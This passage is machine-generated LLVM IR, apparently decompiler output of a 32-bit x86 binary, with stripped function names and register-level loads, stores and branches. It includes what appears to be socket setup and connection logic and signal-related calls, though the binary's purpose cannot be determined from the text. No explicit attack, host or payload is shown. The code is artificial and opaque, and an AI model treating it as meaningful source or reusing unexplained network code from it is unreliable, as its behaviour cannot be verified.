  %v11_8050f4f = icmp ult i16 %v1_8050f4f, %v5_8050f4f
  br i1 %v11_8050f4f, label %dec_label_pc_8050f43, label %dec_label_pc_8050f55

dec_label_pc_8050f55:                             ; preds = %dec_label_pc_8050f4f
  %v3_8050f55 = add i32 %v0_8050f44, 10
  %v4_8050f55 = inttoptr i32 %v3_8050f55 to i16*
  %v5_8050f55 = load i16, i16* %v4_8050f55, align 2
  %v11_8050f55 = icmp ult i16 %v1_8050f4f, %v5_8050f55
  %v1_8050f59 = icmp eq i1 %v11_8050f55, false
  br i1 %v1_8050f59, label %dec_label_pc_8050f43, label %dec_label_pc_8050f5b.loopexit

dec_label_pc_8050f5b.loopexit:                    ; preds = %dec_label_pc_8050f55
  br label %dec_label_pc_8050f5b

dec_label_pc_8050f5b:                             ; preds = %dec_label_pc_8050f5b.loopexit, %dec_label_pc_8051031
  %v0_8050f5e = phi i32 [ %v0_8050f44, %dec_label_pc_8050f5b.loopexit ], [ 0, %dec_label_pc_8051031 ]
  %v0_8050f5b = load i32, i32* @edi, align 4
  %v1_8050f5b = add i32 %v0_8050f5b, 4
  %v2_8050f5b = inttoptr i32 %v1_8050f5b to i32*
  %v3_8050f5b = load i32, i32* %v2_8050f5b, align 4
  store i32 %v3_8050f5b, i32* %ecx.global-to-local, align 4
  %v2_8050f5e = inttoptr i32 %v0_8050f5b to i32*
  store i32 %v0_8050f5e, i32* %v2_8050f5e, align 4
  %v0_8050f60 = load i32, i32* @edi, align 4
  %v1_8050f60 = add i32 %v0_8050f60, 24
  %v2_8050f60 = inttoptr i32 %v1_8050f60 to i32*
  store i32 0, i32* %v2_8050f60, align 4
  %v0_8050567.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805056f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050567

dec_label_pc_8050f6c:                             ; preds = %dec_label_pc_8050ecb
  %v0_8050f6f = load i32, i32* @edi, align 4
  %v1_8050f6f = add i32 %v0_8050f6f, 4
  %v2_8050f6f = inttoptr i32 %v1_8050f6f to i32*
  %v3_8050f6f = load i32, i32* %v2_8050f6f, align 4
  store i32 %v3_8050f6f, i32* %eax.global-to-local, align 4
  %v2_8050f72 = add i32 %v0_8050f01, 16
  %v3_8050f72 = inttoptr i32 %v2_8050f72 to i32*
  store i32 %v3_8050f6f, i32* %v3_8050f72, align 4
  %v1_8050f73 = call i32 @function_80521e1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050f73, i32* %eax.global-to-local, align 4
  %v0_8050f7b = load i32, i32* @edi, align 4
  %v1_8050f7b = add i32 %v0_8050f7b, 4
  %v2_8050f7b = inttoptr i32 %v1_8050f7b to i32*
  store i32 -1, i32* %v2_8050f7b, align 4
  %v0_8050f82 = load i32, i32* @edi, align 4
  %v1_8050f82 = add i32 %v0_8050f82, 284
  %v2_8050f82 = inttoptr i32 %v1_8050f82 to i8*
  store i8 0, i8* %v2_8050f82, align 1
  %v0_8050f89 = load i32, i32* @edi, align 4
  %v1_8050f89 = add i32 %v0_8050f89, 12
  %v2_8050f89 = inttoptr i32 %v1_8050f89 to i32*
  store i32 0, i32* %v2_8050f89, align 4
  br label %dec_label_pc_805057e

dec_label_pc_8050f95:                             ; preds = %dec_label_pc_805049d
  %v3_8050fa0 = add nuw nsw i32 %v2_8050fa0, 1572
  %v4_8050fa0 = add i32 %v3_8050fa0, %v0_8050fa0
  %v5_8050fa0 = inttoptr i32 %v4_8050fa0 to i32*
  %v6_8050fa0 = load i32, i32* %v5_8050fa0, align 4
  %v9_8050fa0 = shl i32 1, %v1_8050f9a
  %v12_8050fa0 = or i32 %v6_8050fa0, %v9_8050fa0
  store i32 %v12_8050fa0, i32* %v5_8050fa0, align 4
  %v0_8050fa8 = load i32, i32* @ebx, align 4
  %v1_8050fa8 = add i32 %v0_8050fa8, 4
  %v2_8050fa8 = inttoptr i32 %v1_8050fa8 to i32*
  %v3_8050fa8 = load i32, i32* %v2_8050fa8, align 4
  store i32 %v3_8050fa8, i32* %eax.global-to-local, align 4
  %v0_8050fab = load i32, i32* @esi, align 4
  %v2_8050fab = sub i32 %v0_8050fab, %v3_8050fa8
  %v8_8050fab = xor i32 %v0_8050fab, %v3_8050fa8
  %v9_8050fab = xor i32 %v2_8050fab, %v0_8050fab
  %v10_8050fab = and i32 %v9_8050fab, %v8_8050fab
  %v11_8050fab = icmp slt i32 %v10_8050fab, 0
  %v13_8050fab = icmp slt i32 %v2_8050fab, 0
  %v2_8050fad = icmp eq i1 %v13_8050fab, %v11_8050fab
  br i1 %v2_8050fad, label %dec_label_pc_80504c0, label %dec_label_pc_8050fb3

dec_label_pc_8050fb3:                             ; preds = %dec_label_pc_8050f95
  store i32 %v3_8050fa8, i32* @esi, align 4
  br label %dec_label_pc_80504c0

dec_label_pc_8050fc0:                             ; preds = %dec_label_pc_805048b
  %v0_8050fc0 = load i32, i32* @esp, align 4
  %v1_8050fc3 = add i32 %v2_805047d, 4
  %v2_8050fc3 = inttoptr i32 %v1_8050fc3 to i32*
  %v3_8050fc3 = load i32, i32* %v2_8050fc3, align 4
  store i32 %v3_8050fc3, i32* %edx.global-to-local, align 4
  %v2_8050fc6 = add i32 %v0_8050fc0, -16
  %v3_8050fc6 = inttoptr i32 %v2_8050fc6 to i32*
  store i32 %v3_8050fc3, i32* %v3_8050fc6, align 4
  %v1_8050fc7 = call i32 @function_80521e1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050fc7, i32* %eax.global-to-local, align 4
  %v0_8050fcf = load i32, i32* @ebx, align 4
  %v1_8050fcf = add i32 %v0_8050fcf, 4
  %v2_8050fcf = inttoptr i32 %v1_8050fcf to i32*
  store i32 -1, i32* %v2_8050fcf, align 4
  %v0_8050fd6 = load i32, i32* @ebx, align 4
  %v1_8050fd6 = add i32 %v0_8050fd6, 12
  %v2_8050fd6 = inttoptr i32 %v1_8050fd6 to i32*
  %v3_8050fd6 = load i32, i32* %v2_8050fd6, align 4
  %tmp301 = icmp ult i32 %v3_8050fd6, 3
  br i1 %tmp301, label %dec_label_pc_805100f, label %dec_label_pc_8050fdc

dec_label_pc_8050fdc:                             ; preds = %dec_label_pc_8050fc0
  %v1_8050fdc = add i32 %v0_8050fd6, 284
  %v2_8050fdc = inttoptr i32 %v1_8050fdc to i8*
  %v3_8050fdc = load i8, i8* %v2_8050fdc, align 1
  %v4_8050fdc = zext i8 %v3_8050fdc to i32
  %v6_8050fdc = and i32 %v1_8050fc7, -256
  %v7_8050fdc = or i32 %v4_8050fdc, %v6_8050fdc
  %v1_8050fe2 = add i32 %v7_8050fdc, 1
  %v10_8050fe2 = trunc i32 %v1_8050fe2 to i8
  store i32 %v1_8050fe2, i32* %eax.global-to-local, align 4
  store i8 %v10_8050fe2, i8* %v2_8050fdc, align 1
  %v0_8050fe9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fe9 = trunc i32 %v0_8050fe9 to i8
  %v10_8050fe9 = icmp eq i8 %v1_8050fe9, 10
  %v0_805100f.pre = load i32, i32* @ebx, align 4
  br i1 %v10_8050fe9, label %dec_label_pc_805100f, label %dec_label_pc_8050fed

dec_label_pc_8050fed:                             ; preds = %dec_label_pc_8050fdc
  store i32 %v0_805100f.pre, i32* @eax, align 4
  %v0_8050fef = call i32 @function_804f800()
  store i32 %v0_8050fef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504c0

dec_label_pc_8051000:                             ; preds = %dec_label_pc_8050e41
  %v0_8051000 = load i32, i32* @edi, align 4
  store i32 %v0_8051000, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_8051005 = call i32 @function_804f800()
  store i32 %v0_8051005, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050941

dec_label_pc_805100f:                             ; preds = %dec_label_pc_8050fdc, %dec_label_pc_8050fc0
  %v0_805100f = phi i32 [ %v0_8050fd6, %dec_label_pc_8050fc0 ], [ %v0_805100f.pre, %dec_label_pc_8050fdc ]
  %v1_805100f = add i32 %v0_805100f, 284
  %v2_805100f = inttoptr i32 %v1_805100f to i8*
  store i8 0, i8* %v2_805100f, align 1
  %v0_8051016 = load i32, i32* @ebx, align 4
  %v1_8051016 = add i32 %v0_8051016, 12
  %v2_8051016 = inttoptr i32 %v1_8051016 to i32*
  store i32 0, i32* %v2_8051016, align 4
  br label %dec_label_pc_80504c0

dec_label_pc_8051022:                             ; preds = %dec_label_pc_805046d
  br i1 %v5_8050482, label %dec_label_pc_80504c0, label %dec_label_pc_805102a

dec_label_pc_805102a:                             ; preds = %dec_label_pc_8051022
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805048b

dec_label_pc_8051031.loopexit:                    ; preds = %dec_label_pc_8050f43
  br label %dec_label_pc_8051031

dec_label_pc_8051031:                             ; preds = %dec_label_pc_8051031.loopexit, %dec_label_pc_8050f0d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f5b

dec_label_pc_8051038:                             ; preds = %dec_label_pc_8050b2c
  %v1_8051038 = add i32 %v0_8050618, 56
  %v2_8051038 = inttoptr i32 %v1_8051038 to i32*
  %v3_8051038 = load i32, i32* %v2_8051038, align 4
  store i32 %v3_8051038, i32* %eax.global-to-local, align 4
  %v1_805103c = inttoptr i32 %v3_8051038 to i32*
  store i32 104, i32* %v1_805103c, align 4
  %v0_8050b48.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b48

dec_label_pc_8051047:                             ; preds = %dec_label_pc_8050b48
  store i32 %v0_8051047, i32* @eax, align 4
  %v0_8051049 = call i32 @function_804f800()
  store i32 %v0_8051049, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805057e

dec_label_pc_8051053:                             ; preds = %dec_label_pc_8050afe
  %v11_8051053 = icmp eq i8 %v2_8050afe, -5
  %v1_8051055 = icmp eq i1 %v11_8051053, false
  br i1 %v1_8051055, label %dec_label_pc_805068e, label %dec_label_pc_805105b

dec_label_pc_805105b:                             ; preds = %dec_label_pc_8051053
  store i8 -3, i8* %v1_8050afe, align 1
  %v4_805068e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805068e

dec_label_pc_805107e:                             ; preds = %dec_label_pc_80508fc
  %v1_805107e = add i32 %v0_8050917, 1
  %v8_805107e = icmp eq i32 %v1_805107e, 0
  store i32 %v1_805107e, i32* %eax.global-to-local, align 4
  br i1 %v8_805107e, label %dec_label_pc_8050924, label %dec_label_pc_8051085

dec_label_pc_8051085:                             ; preds = %dec_label_pc_805107e
  %v0_8051085 = load i32, i32* @ecx, align 4
  %v1_8051085 = load i32, i32* @esp, align 4
  %v2_8051085 = add i32 %v1_8051085, -4
  %v3_8051085 = inttoptr i32 %v2_8051085 to i32*
  store i32 %v0_8051085, i32* %v3_8051085, align 4
  %v1_8051086 = add i32 %v1_8051085, -8
  %v2_8051086 = inttoptr i32 %v1_8051086 to i32*
  store i32 0, i32* %v2_8051086, align 4
  %v1_8051088 = add i32 %v1_8051085, -12
  %v2_8051088 = inttoptr i32 %v1_8051088 to i32*
  store i32 1, i32* %v2_8051088, align 4
  %v1_805108a = add i32 %v1_8051085, -16
  %v2_805108a = inttoptr i32 %v1_805108a to i32*
  store i32 2, i32* %v2_805108a, align 4
  %v3_805108c = call i32 @function_80529d5(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_8051091 = load i32, i32* @esp, align 4
  %v2_8051091 = add i32 %v1_8051091, 48
  %v3_8051091 = inttoptr i32 %v2_8051091 to i32*
  store i32 %v3_805108c, i32* %v3_8051091, align 4
  %v0_8051095 = load i32, i32* @esp, align 4
  %v1_8051098 = add i32 %v3_805108c, 1
  %v8_8051098 = icmp eq i32 %v1_8051098, 0
  store i32 %v1_8051098, i32* @eax, align 4
  %v2_80502eb = inttoptr i32 %v0_8051095 to i32*
  br i1 %v8_8051098, label %dec_label_pc_80502e8, label %dec_label_pc_805109f

dec_label_pc_805109f:                             ; preds = %dec_label_pc_8051085
  store i32 18, i32* %v2_80502eb, align 4
  %v2_80510a4 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80510a4, i32* %eax.global-to-local, align 4
  %v0_80510a9 = load i32, i32* @esp, align 4
  %v1_80510a9 = inttoptr i32 %v0_80510a9 to i32*
  store i32 19, i32* %v1_80510a9, align 4
  %v2_80510b0 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80510b0, i32* %eax.global-to-local, align 4
  %v0_80510b5 = load i32, i32* @esp, align 4
  %v1_80510b5 = inttoptr i32 %v0_80510b5 to i32*
  %v2_80510b5 = load i32, i32* %v1_80510b5, align 4
  store i32 %v2_80510b5, i32* %eax.global-to-local, align 4
  %v3_80510b5 = add i32 %v0_80510b5, 4
  %v1_80510b6 = inttoptr i32 %v3_80510b5 to i32*
  %v2_80510b6 = load i32, i32* %v1_80510b6, align 4
  store i32 %v2_80510b6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80510b6, align 4
  store i32 18, i32* %v1_80510b5, align 4
  %v3_80510bb = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80510bb, i32* %eax.global-to-local, align 4
  %v1_80510c0 = load i32, i32* @esp, align 4
  %v2_80510c0 = inttoptr i32 %v1_80510c0 to i32*
  store i32 %v3_80510bb, i32* %v2_80510c0, align 4
  %v2_80510c3 = call i32 @function_804f340(i8* bitcast (i32* @0 to i8*))
  store i32 %v2_80510c3, i32* %eax.global-to-local, align 4
  %v0_80510c8 = load i32, i32* @esp, align 4
  store i32 %v2_80510c3, i32* @esi, align 4
  %v2_80510cd = icmp eq i32 %v2_80510c3, 0
  br i1 %v2_80510cd, label %dec_label_pc_8050924, label %dec_label_pc_80510d5

dec_label_pc_80510d5:                             ; preds = %dec_label_pc_805109f
  %v1_80510d5 = add i32 %v0_80510c8, 1844
  %v2_80510d5 = inttoptr i32 %v1_80510d5 to i16*
  store i16 2, i16* %v2_80510d5, align 2
  %v2_80510df = add i32 %v2_80510c3, 4
  %v3_80510df = inttoptr i32 %v2_80510df to i32*
  %v4_80510df = load i32, i32* %v3_80510df, align 4
  store i32 %v4_80510df, i32* @ebx, align 4
  %v1_80510e2 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_80510e2 = sext i32 %v1_80510e2 to i64
  store i32 %v1_80510e2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80510e9 = load i32, i32* @esi, align 4
  %v1_80510e9 = inttoptr i32 %v0_80510e9 to i8*
  %v2_80510e9 = load i8, i8* %v1_80510e9, align 1
  %v3_80510e9 = zext i8 %v2_80510e9 to i32
  store i32 %v3_80510e9, i32* %ecx.global-to-local, align 4
  %v8_80510ef = zext i8 %v2_80510e9 to i64
  %v9_80510ef = udiv i64 %v2_80510e2, %v8_80510ef
  %v10_80510ef = trunc i64 %v9_80510ef to i32
  store i32 %v10_80510ef, i32* %eax.global-to-local, align 4
  %v11_80510ef = urem i64 %v2_80510e2, %v8_80510ef
  %v12_80510ef = trunc i64 %v11_80510ef to i32
  store i32 %v12_80510ef, i32* %edx.global-to-local, align 4
  %v0_80510f1 = load i32, i32* @ebx, align 4
  %v2_80510f1 = mul nuw nsw i32 %v12_80510ef, 4
  %v3_80510f1 = add i32 %v2_80510f1, %v0_80510f1
  %v4_80510f1 = inttoptr i32 %v3_80510f1 to i32*
  %v5_80510f1 = load i32, i32* %v4_80510f1, align 4
  store i32 %v5_80510f1, i32* %eax.global-to-local, align 4
  %v1_80510f4 = load i32, i32* @esp, align 4
  %v2_80510f4 = add i32 %v1_80510f4, 1832
  %v3_80510f4 = inttoptr i32 %v2_80510f4 to i32*
  store i32 %v5_80510f1, i32* %v3_80510f4, align 4
  %v0_80510fb = load i32, i32* @edi, align 4
  %v1_80510fb = load i32, i32* @esp, align 4
  %v2_80510fb = add i32 %v1_80510fb, -4
  %v3_80510fb = inttoptr i32 %v2_80510fb to i32*
  store i32 %v0_80510fb, i32* %v3_80510fb, align 4
  %v0_80510fc = load i32, i32* @edi, align 4
  %v2_80510fc = add i32 %v1_80510fb, -8
  %v3_80510fc = inttoptr i32 %v2_80510fc to i32*
  store i32 %v0_80510fc, i32* %v3_80510fc, align 4
  %v1_80510fd = add i32 %v1_80510fb, -12
  %v2_80510fd = inttoptr i32 %v1_80510fd to i32*
  store i32 0, i32* %v2_80510fd, align 4
  %v1_80510ff = add i32 %v1_80510fb, -16
  %v2_80510ff = inttoptr i32 %v1_80510ff to i32*
  store i32 19, i32* %v2_80510ff, align 4
  %v3_8051101 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_8051101 = inttoptr i32 %v3_8051101 to i16*
  store i32 %v3_8051101, i32* %eax.global-to-local, align 4
  %v3_8051106 = load i16, i16* %v4_8051101, align 2
  %v4_8051106 = zext i16 %v3_8051106 to i32
  %v7_8051106 = and i32 %v3_8051101, -65536
  %v8_8051106 = or i32 %v4_8051106, %v7_8051106
  store i32 %v8_8051106, i32* %eax.global-to-local, align 4
  %v0_8051109 = load i32, i32* @esi, align 4
  %v1_8051109 = load i32, i32* @esp, align 4
  %v2_8051109 = inttoptr i32 %v1_8051109 to i32*
  store i32 %v0_8051109, i32* %v2_8051109, align 4
  %v0_805110c = load i32, i32* %eax.global-to-local, align 4
  %v1_805110c = trunc i32 %v0_805110c to i16
  %v2_805110c = load i32, i32* @esp, align 4
  %v3_805110c = add i32 %v2_805110c, 1846
  %v4_805110c = inttoptr i32 %v3_805110c to i16*
  store i16 %v1_805110c, i16* %v4_805110c, align 2
  %v1_8051114 = call i32 @function_804f300(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051114, i32* %eax.global-to-local, align 4
  %v0_8051119 = load i32, i32* @esp, align 4
  %v1_8051119 = inttoptr i32 %v0_8051119 to i32*
  store i32 18, i32* %v1_8051119, align 4
  %v2_8051120 = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051120, i32* %eax.global-to-local, align 4
  %v0_8051125 = load i32, i32* @esp, align 4
  %v1_8051125 = inttoptr i32 %v0_8051125 to i32*
  store i32 19, i32* %v1_8051125, align 4
  %v2_805112c = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  %v0_8051131 = load i32, i32* @esp, align 4
  %v1_8051131 = add i32 %v0_8051131, 1844
  store i32 %v1_8051131, i32* %eax.global-to-local, align 4
  %v1_805113b = add i32 %v0_8051131, 8
  %v2_805113b = inttoptr i32 %v1_805113b to i32*
  store i32 16, i32* %v2_805113b, align 4
  %v0_805113d = load i32, i32* %eax.global-to-local, align 4
  %v2_805113d = add i32 %v0_8051131, 4
  %v3_805113d = inttoptr i32 %v2_805113d to i32*
  store i32 %v0_805113d, i32* %v3_805113d, align 4
  %v1_805113e = add i32 %v0_8051131, 48
  %v2_805113e = inttoptr i32 %v1_805113e to i32*
  %v3_805113e = load i32, i32* %v2_805113e, align 4
  store i32 %v3_805113e, i32* %esi.global-to-local, align 4
  %v3_8051142 = inttoptr i32 %v0_8051131 to i32*
  store i32 %v3_805113e, i32* %v3_8051142, align 4
  %v3_8051143 = call i32 @function_80527fa(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8051148 = load i32, i32* @esp, align 4
  %v1_8051148 = add i32 %v0_8051148, 16
  %v1_805114b = add i32 %v3_8051143, 1
  %v8_805114b = icmp eq i32 %v1_805114b, 0
  store i32 %v1_805114b, i32* %eax.global-to-local, align 4
  %v1_805114c = icmp eq i1 %v8_805114b, false
  br i1 %v1_805114c, label %dec_label_pc_8051167, label %dec_label_pc_805114e

dec_label_pc_805114e:                             ; preds = %dec_label_pc_80510d5
  br label %dec_label_pc_8051151

dec_label_pc_8051151:                             ; preds = %dec_label_pc_8051167, %dec_label_pc_805114e
  %storemerge4.in = phi i32 [ %v0_8051148, %dec_label_pc_805114e ], [ %v0_805122e, %dec_label_pc_8051167 ]
  %v1_8051151 = add i32 %storemerge4.in, 48
  %v2_8051151 = inttoptr i32 %v1_8051151 to i32*
  %v3_8051151 = load i32, i32* %v2_8051151, align 4
  store i32 %v3_8051151, i32* @edi, align 4
  %v3_8051155 = inttoptr i32 %storemerge4.in to i32*
  store i32 %v3_8051151, i32* %v3_8051155, align 4
  %v1_8051156 = call i32 @function_80521e1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051156, i32* @eax, align 4
  %v0_805115b = load i32, i32* @esp, align 4
  %v1_805115b = inttoptr i32 %v0_805115b to i32*
  store i32 0, i32* %v1_805115b, align 4
  %v1_8051162 = call i32 @function_8053d29(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051162, i32* %eax.global-to-local, align 4
  %v0_8051167.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051167

dec_label_pc_8051167:                             ; preds = %dec_label_pc_80510d5, %dec_label_pc_8051151
  %v0_8051167 = phi i32 [ %v1_8051148, %dec_label_pc_80510d5 ], [ %v0_8051167.pre, %dec_label_pc_8051151 ]
  %v1_8051167 = add i32 %v0_8051167, 1864
  %v2_8051167 = inttoptr i32 %v1_8051167 to i8*
  store i8 0, i8* %v2_8051167, align 1
  %v0_805116f = load i32, i32* @esp, align 4
  %v1_805116f = add i32 %v0_805116f, -4
  %v2_805116f = inttoptr i32 %v1_805116f to i32*
  store i32 16384, i32* %v2_805116f, align 4
  %v1_8051174 = add i32 %v0_805116f, -8
  %v2_8051174 = inttoptr i32 %v1_8051174 to i32*
  store i32 1, i32* %v2_8051174, align 4
  %v1_8051176 = add i32 %v0_805116f, 1864
  store i32 %v1_8051176, i32* %eax.global-to-local, align 4
  %v2_805117d = add i32 %v0_805116f, -12
  %v3_805117d = inttoptr i32 %v2_805117d to i32*
  store i32 %v1_8051176, i32* %v3_805117d, align 4
  %v1_805117e = add i32 %v0_805116f, 32
  %v2_805117e = inttoptr i32 %v1_805117e to i32*
  %v3_805117e = load i32, i32* %v2_805117e, align 4
  store i32 %v3_805117e, i32* @ebx, align 4
  %v2_8051182 = add i32 %v0_805116f, -16
  %v3_8051182 = inttoptr i32 %v2_8051182 to i32*
  store i32 %v3_805117e, i32* %v3_8051182, align 4
  %v0_8051183 = call i32 @function_8052924()
  %v0_8051188 = load i32, i32* @esp, align 4
  %v1_8051188 = add i32 %v0_8051188, -4
  %v2_8051188 = inttoptr i32 %v1_8051188 to i32*
  store i32 16384, i32* %v2_8051188, align 4
  %v1_805118d = add i32 %v0_8051188, -8
  %v2_805118d = inttoptr i32 %v1_805118d to i32*
  store i32 4, i32* %v2_805118d, align 4
  %v1_805118f = add i32 %v0_8051188, 1888
  store i32 %v1_805118f, i32* %eax.global-to-local, align 4
  %v2_8051196 = add i32 %v0_8051188, -12
  %v3_8051196 = inttoptr i32 %v2_8051196 to i32*
  store i32 %v1_805118f, i32* %v3_8051196, align 4
  %v1_8051197 = add i32 %v0_8051188, 48
  %v2_8051197 = inttoptr i32 %v1_8051197 to i32*
  %v3_8051197 = load i32, i32* %v2_8051197, align 4
  store i32 %v3_8051197, i32* %ecx.global-to-local, align 4
  %v2_805119b = add i32 %v0_8051188, -16
  %v3_805119b = inttoptr i32 %v2_805119b to i32*
  store i32 %v3_8051197, i32* %v3_805119b, align 4
  %v0_805119c = call i32 @function_8052924()
  %v0_80511a1 = load i32, i32* @esp, align 4
  %v1_80511a4 = add i32 %v0_80511a1, 28
  %v2_80511a4 = inttoptr i32 %v1_80511a4 to i32*
  store i32 16384, i32* %v2_80511a4, align 4
  %v1_80511a9 = add i32 %v0_80511a1, 24
  %v2_80511a9 = inttoptr i32 %v1_80511a9 to i32*
  store i32 2, i32* %v2_80511a9, align 4
  %v1_80511ab = add i32 %v0_80511a1, 1914
  store i32 %v1_80511ab, i32* %eax.global-to-local, align 4
  %v2_80511b2 = add i32 %v0_80511a1, 20
  %v3_80511b2 = inttoptr i32 %v2_80511b2 to i32*
  store i32 %v1_80511ab, i32* %v3_80511b2, align 4
  %v1_80511b3 = add i32 %v0_80511a1, 64
  %v2_80511b3 = inttoptr i32 %v1_80511b3 to i32*
  %v3_80511b3 = load i32, i32* %v2_80511b3, align 4
  store i32 %v3_80511b3, i32* %edx.global-to-local, align 4
  %v2_80511b7 = add i32 %v0_80511a1, 16
  %v3_80511b7 = inttoptr i32 %v2_80511b7 to i32*
  store i32 %v3_80511b3, i32* %v3_80511b7, align 4
  %v0_80511b8 = call i32 @function_8052924()
  store i32 %v0_80511b8, i32* %eax.global-to-local, align 4
  %v0_80511bd = load i32, i32* @esp, align 4
  %v1_80511bd = add i32 %v0_80511bd, -4
  %v2_80511bd = inttoptr i32 %v1_80511bd to i32*
  store i32 16384, i32* %v2_80511bd, align 4
  %v1_80511c2 = add i32 %v0_80511bd, -8
  %v2_80511c2 = inttoptr i32 %v1_80511c2 to i32*
  store i32 1, i32* %v2_80511c2, align 4
  %v1_80511c4 = add i32 %v0_80511bd, 52
  %v2_80511c4 = inttoptr i32 %v1_80511c4 to i32*
  %v3_80511c4 = load i32, i32* %v2_80511c4, align 4
  %v1_80511c8 = add i32 %v3_80511c4, 12
  store i32 %v1_80511c8, i32* %eax.global-to-local, align 4
  %v2_80511cb = add i32 %v0_80511bd, -12
  %v3_80511cb = inttoptr i32 %v2_80511cb to i32*
  store i32 %v1_80511c8, i32* %v3_80511cb, align 4
  %v1_80511cc = add i32 %v0_80511bd, 48
  %v2_80511cc = inttoptr i32 %v1_80511cc to i32*
  %v3_80511cc = load i32, i32* %v2_80511cc, align 4
  store i32 %v3_80511cc, i32* %eax.global-to-local, align 4
  %v2_80511d0 = add i32 %v0_80511bd, -16
  %v3_80511d0 = inttoptr i32 %v2_80511d0 to i32*
  store i32 %v3_80511cc, i32* %v3_80511d0, align 4
  %v0_80511d1 = call i32 @function_8052924()
  %v0_80511d6 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80511db = add i32 %v0_80511d6, 28
  %v2_80511db = inttoptr i32 %v1_80511db to i32*
  store i32 16384, i32* %v2_80511db, align 4
  %v1_80511e0 = add i32 %v0_80511d6, 68
  %v2_80511e0 = inttoptr i32 %v1_80511e0 to i32*
  %v3_80511e0 = load i32, i32* %v2_80511e0, align 4
  store i32 %v3_80511e0, i32* %edx.global-to-local, align 4
  %v1_80511e4 = add i32 %v3_80511e0, 12
  %v2_80511e4 = inttoptr i32 %v1_80511e4 to i8*
  %v3_80511e4 = load i8, i8* %v2_80511e4, align 1
  %v4_80511e4 = zext i8 %v3_80511e4 to i32
  %v5_80511e4 = load i32, i32* %eax.global-to-local, align 4
  %v6_80511e4 = and i32 %v5_80511e4, -256
  %v7_80511e4 = or i32 %v6_80511e4, %v4_80511e4
  store i32 %v7_80511e4, i32* %eax.global-to-local, align 4
  %v2_80511e7 = add i32 %v0_80511d6, 24
  %v3_80511e7 = inttoptr i32 %v2_80511e7 to i32*
  store i32 %v7_80511e4, i32* %v3_80511e7, align 4
  %v0_80511e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80511e8 = inttoptr i32 %v0_80511e8 to i32*
  %v2_80511e8 = load i32, i32* %v1_80511e8, align 4
  store i32 %v2_80511e8, i32* %eax.global-to-local, align 4
  %v2_80511ea = add i32 %v0_80511d6, 20
  %v3_80511ea = inttoptr i32 %v2_80511ea to i32*
  store i32 %v2_80511e8, i32* %v3_80511ea, align 4
  %v1_80511eb = add i32 %v0_80511d6, 64
  %v2_80511eb = inttoptr i32 %v1_80511eb to i32*
  %v3_80511eb = load i32, i32* %v2_80511eb, align 4
  store i32 %v3_80511eb, i32* %eax.global-to-local, align 4
  %v2_80511ef = add i32 %v0_80511d6, 16
  %v3_80511ef = inttoptr i32 %v2_80511ef to i32*
  store i32 %v3_80511eb, i32* %v3_80511ef, align 4
  %v0_80511f0 = call i32 @function_8052924()
  store i32 %v0_80511f0, i32* %eax.global-to-local, align 4
  %v0_80511f5 = load i32, i32* @esp, align 4
  %v1_80511f5 = add i32 %v0_80511f5, -4
  %v2_80511f5 = inttoptr i32 %v1_80511f5 to i32*
  store i32 16384, i32* %v2_80511f5, align 4
  %v1_80511fa = add i32 %v0_80511f5, -8
  %v2_80511fa = inttoptr i32 %v1_80511fa to i32*
  store i32 1, i32* %v2_80511fa, align 4
  %v1_80511fc = add i32 %v0_80511f5, 52
  %v2_80511fc = inttoptr i32 %v1_80511fc to i32*
  %v3_80511fc = load i32, i32* %v2_80511fc, align 4
  %v1_8051200 = add i32 %v3_80511fc, 13
  store i32 %v1_8051200, i32* %eax.global-to-local, align 4
  %v2_8051203 = add i32 %v0_80511f5, -12
  %v3_8051203 = inttoptr i32 %v2_8051203 to i32*
  store i32 %v1_8051200, i32* %v3_8051203, align 4
  %v1_8051204 = add i32 %v0_80511f5, 48
  %v2_8051204 = inttoptr i32 %v1_8051204 to i32*
  %v3_8051204 = load i32, i32* %v2_8051204, align 4
  store i32 %v3_8051204, i32* %eax.global-to-local, align 4
  %v2_8051208 = add i32 %v0_80511f5, -16
  %v3_8051208 = inttoptr i32 %v2_8051208 to i32*
  store i32 %v3_8051204, i32* %v3_8051208, align 4
  %v0_8051209 = call i32 @function_8052924()
  %v0_805120e = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051213 = add i32 %v0_805120e, 28
  %v2_8051213 = inttoptr i32 %v1_8051213 to i32*
  store i32 16384, i32* %v2_8051213, align 4
  %v1_8051218 = add i32 %v0_805120e, 68
  %v2_8051218 = inttoptr i32 %v1_8051218 to i32*
